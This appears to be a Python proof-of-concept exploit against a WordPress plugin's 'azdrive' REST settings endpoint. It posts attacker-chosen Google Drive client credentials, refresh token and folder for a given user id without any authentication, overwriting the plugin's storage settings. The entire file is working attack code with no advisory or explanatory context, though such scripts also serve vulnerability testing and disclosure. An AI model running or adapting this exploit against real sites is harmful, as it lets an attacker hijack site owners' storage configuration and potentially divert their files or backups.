import sys
import requests
import json

if len(sys.argv) != 3:
    print(f"Usage: {sys.argv[0]} <target_url> <user_id>")
    print(f"Example: {sys.argv[0]} http://localhost/wordpress 2")
    sys.exit(1)

target = sys.argv[1].rstrip("/")
user_id = sys.argv[2]

endpoint = f"{target}/index.php/wp-json/azdrive/v1/settings"
print(f"[+] Target: {endpoint}")

payload = {
    "drive_type": "google",
    "google_client_id": "evil_client",
    "google_client_secret": "evil_secret",
    "google_refresh_token": "evil_token",
    "google_folder_id": "root",
    "user_id": user_id
}

print(f"[+] Injecting malicious settings for admin_id={user_id}")
headers = {
    "Content-Type": "application/json"
}

response = requests.post(endpoint, headers=headers, data=json.dumps(payload))

print(f"[+] Status Code: {response.status_code}")
try:
    print("[+] Server Response:")
    print(response.json())
except:
    print(response.text)
